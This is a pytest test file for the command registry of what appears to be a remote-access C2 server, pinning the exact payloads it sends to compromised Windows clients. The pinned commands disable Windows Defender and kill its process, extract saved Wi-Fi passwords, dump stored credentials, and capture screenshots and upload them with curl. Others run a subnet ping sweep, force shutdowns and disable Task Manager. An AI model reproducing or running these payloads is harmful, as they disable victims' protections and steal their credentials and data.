"""Tests for the Empire-style command registry (C2/commands.py).

Covers registration/lookup (incl. aliases), the CmdContext.send primitive,
handler return contracts, and — critically — byte-exact regression guards
that pin the CMD payloads to the values the legacy elif blocks sent, so a
future refactor can never silently change what is transmitted to clients.
"""
import sys
from unittest.mock import MagicMock, patch

import pytest

sys.path.insert(0, "C2")

from commands import (  # noqa: E402
    CATEGORY_MEDIA,
    CATEGORY_NETWORK,
    CATEGORY_SYSTEM_CONTROL,
    CATEGORY_SYSTEM_INFO,
    CmdContext,
    Command,
    CommandRegistry,
    command_registry,
)


@pytest.fixture
def ctx():
    recorder = MagicMock()
    recorder._send_message = MagicMock(return_value=True)
    recorder._recv_message = MagicMock(return_value=b"command output")
    client = {"lock": MagicMock(), "command_in_progress": False, "conn": object()}
    return CmdContext(
        cm=recorder,
        client=client,
        conn=object(),
        username="Tester",
        addr=("10.0.0.9", 7777),
        logger=MagicMock(),
    )


def _payloads(ctx, handler):
    """Run a handler and return the list of raw payloads it sent."""
    payloads = []

    def record(conn, data):
        payloads.append(data)
        return True

    ctx.cm._send_message = MagicMock(side_effect=record)
    with patch("builtins.input", return_value="MyWiFi"):
        result = handler(ctx)
    return payloads, result


# ---------------------------------------------------------------------------
# Registry mechanics
# ---------------------------------------------------------------------------
class TestRegistry:
    def test_lookup_by_name_and_alias(self):
        assert command_registry.get("sys") is command_registry.get("system")
        assert command_registry.get("shutdown") is command_registry.get("off")
        assert command_registry.get("does-not-exist") is None
        assert command_registry.contains("sys")
        assert not command_registry.contains("nope")

    def test_all_migrated_commands_registered(self):
        migrated = [
            "screenshot", "devices", "wifi", "sys", "task", "shutdown",
            "restart", "ip", "lock", "disable task manager",
            "enable task manager", "recycle", "clipboard", "rickroll",
            "netscan", "info", "killav", "creds",
        ]
        missing = [c for c in migrated if not command_registry.contains(c)]
        assert missing == []

    def test_every_registered_command_has_metadata(self):
        for cmd in command_registry.list_commands():
            assert cmd.name
            assert cmd.description
            assert cmd.category
            assert callable(cmd.handler)

    def test_standalone_registry_register_and_run(self):
        reg = CommandRegistry()
        reg.register(Command("hello", lambda ctx: "handled", CATEGORY_SYSTEM_INFO, "hi"))
        assert reg.contains("hello")
        assert reg.run("hello", object()) == "handled"
        assert reg.run("missing", object()) is None

    def test_help_text_groups_by_category(self):
        text = command_registry.help_text()
        assert "screenshot" in text
        assert "Shows the wifi passwords" in text


# ---------------------------------------------------------------------------
# CmdContext.send semantics
# ---------------------------------------------------------------------------
class TestCmdContextSend:
    def test_send_prepends_cmd_prefix(self, ctx):
        sent, response = ctx.send("systeminfo")
        assert sent is True
        ctx.cm._send_message.assert_called_once()
        assert ctx.cm._send_message.call_args[0][1] == "CMD:systeminfo"
        assert response == b"command output"

    def test_send_failure_clears_flag(self, ctx):
        ctx.cm._send_message = MagicMock(return_value=False)
        sent, response = ctx.send("systeminfo")
        assert sent is False
        assert response is None
        assert ctx.client["command_in_progress"] is False


# ---------------------------------------------------------------------------
# Handler behaviour + byte-exact payload guards (regression net)
# ---------------------------------------------------------------------------
class TestMigratedHandlers:
    def test_screenshot_sends_two_payloads(self, ctx):
        payloads, result = _payloads(ctx, command_registry.get("screenshot").handler)
        assert result is None
        assert len(payloads) == 2
        assert payloads[0].startswith("CMD:powershell -command")
        assert "screenshot.png" in payloads[0]
        assert payloads[1].startswith("CMD:curl -F \"file=@%USERPROFILE%\\screenshot.png\"")
        assert "content=Screenshot [Tester]" in payloads[1]

    def test_devices_payload_byte_exact(self, ctx):
        payloads, result = _payloads(ctx, command_registry.get("devices").handler)
        assert result is None
        assert len(payloads) == 1
        expected = "CMD:" + 'powershell -Command "$ff = if (Test-Path \'$env:USERPROFILE\\ffmpeg\\bin\\ffmpeg.exe\') { \'$env:USERPROFILE\\ffmpeg\\bin\\ffmpeg.exe\' } elseif (Test-Path \'$env:USERPROFILE\\ffmpeg.exe\') { \'$env:USERPROFILE\\ffmpeg.exe\' } elseif (Test-Path \'C:\\ffmpeg\\bin\\ffmpeg.exe\') { \'C:\\ffmpeg\\bin\\ffmpeg.exe\' } elseif (Get-Command ffmpeg -ErrorAction SilentlyContinue) { (Get-Command ffmpeg -ErrorAction SilentlyContinue).Source } elseif (Get-ChildItem -Path \\\"$env:USERPROFILE\\ffmpeg*\\\" -Filter \\\"ffmpeg.exe\\\" -Recurse -ErrorAction SilentlyContinue | Select-Object -First 1) { (Get-ChildItem -Path \\\"$env:USERPROFILE\\ffmpeg*\\\" -Filter \\\"ffmpeg.exe\\\" -Recurse -ErrorAction SilentlyContinue | Select-Object -First 1).FullName } else { $null }; if ($ff) { & $ff -list_devices true -f dshow -i dummy } else { Write-Error \'[!] ffmpeg.exe not found. Please run ffmpeg setup first.\' "'
        assert payloads[0] == expected

    def test_netscan_payload_byte_exact(self, ctx):
        payloads, result = _payloads(ctx, command_registry.get("netscan").handler)
        assert result is None
        assert len(payloads) == 1
        expected = "CMD:" + 'powershell -NoProfile -Command "$ipPrefix = ((Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.IPAddress -notlike \'127.*\' -and $_.IPAddress -notlike \'169.254.*\' } | Select-Object -First 1).IPAddress -replace \'\\.\\d+$\'); if ($ipPrefix) { 1..254 | ForEach-Object { $target = \\\"$ipPrefix.$_\\\"; if (Test-Connection -ComputerName $target -Count 1 -Quiet -TimeoutMs 200) { \\\"$target - $(Resolve-DnsName $target -ErrorAction SilentlyContinue | Select-Object -ExpandProperty NameHost -ErrorAction SilentlyContinue)\\\" } } } else { Write-Error \'No active IPv4 interface found.\' }"'
        assert payloads[0] == expected

    def test_sys_sends_systeminfo(self, ctx):
        payloads, result = _payloads(ctx, command_registry.get("sys").handler)
        assert result is None
        assert payloads == ["CMD:systeminfo"]

    def test_task_sends_tasklist(self, ctx):
        payloads, result = _payloads(ctx, command_registry.get("task").handler)
        assert result is None
        assert payloads == ["CMD:tasklist"]

    def test_wifi_prompts_and_interpolates_name(self, ctx):
        payloads, result = _payloads(ctx, command_registry.get("wifi").handler)
        assert result is None
        assert payloads[0] == "CMD:netsh wlan show profiles"
        assert "name=\\\"MyWiFi\\\"" in payloads[1]
        assert "Key-Content" in payloads[1]

    def test_shutdown_clears_flag_unconditionally(self, ctx):
        payloads, result = _payloads(ctx, command_registry.get("shutdown").handler)
        assert result is None
        assert payloads == ["CMD:shutdown /s /f /t 0"]
        assert ctx.client["command_in_progress"] is False
        ctx.logger.assert_any_call("Shutting down (PC) [Tester] . . . .")

    def test_restart_clears_flag_unconditionally(self, ctx):
        payloads, result = _payloads(ctx, command_registry.get("restart").handler)
        assert result is None
        assert payloads == ["CMD:shutdown /r /f /t 0"]
        assert ctx.client["command_in_progress"] is False

    def test_killav_sends_two_payloads(self, ctx):
        payloads, result = _payloads(ctx, command_registry.get("killav").handler)
        assert result is None
        assert payloads == [
            "CMD:powershell -Command \"Set-MpPreference -DisableRealtimeMonitoring $true\"",
            "CMD:taskkill /F /IM MsMpEng.exe",
        ]

    def test_ip_sends_ipify_lookup(self, ctx):
        payloads, result = _payloads(ctx, command_registry.get("ip").handler)
        assert result is None
        assert payloads[0].startswith("CMD:powershell -Command \"(Invoke-WebRequest -uri")
        assert "api.ipify.org" in payloads[0]

    def test_send_failure_returns_break(self, ctx):
        ctx.cm._send_message = MagicMock(return_value=False)
        result = command_registry.get("sys").handler(ctx)
        assert result == "break"

    def test_lock_payload(self, ctx):
        payloads, result = _payloads(ctx, command_registry.get("lock").handler)
        assert result is None
        assert payloads == ["CMD:rundll32.exe user32.dll,LockWorkStation"]

    def test_creds_payload(self, ctx):
        payloads, result = _payloads(ctx, command_registry.get("creds").handler)
        assert result is None
        assert payloads == ["CMD:cmdkey /list > %TEMP%\\creds.txt"]
